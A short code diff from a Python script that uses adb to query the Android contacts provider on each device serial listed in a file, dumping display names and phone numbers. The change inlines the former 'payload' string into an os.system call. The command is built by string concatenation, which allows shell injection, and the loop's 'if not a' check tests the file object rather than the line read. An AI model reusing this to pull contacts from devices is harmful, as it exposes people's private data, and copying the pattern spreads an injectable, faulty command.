@@ -8,8 +8,7 @@ def main():
             a1 = a.readline().strip()
             if not a:
                 break
-            payload = "content query --uri content://contacts/phones/ --projection display_name:number"
-            os.system("adb -s "+a1+" shell "+payload)
+            os.system("adb -s "+a1+" shell content query --uri content://contacts/phones/ --projection display_name:number")
         a.close()
     else:
         print("Failed to get contact")
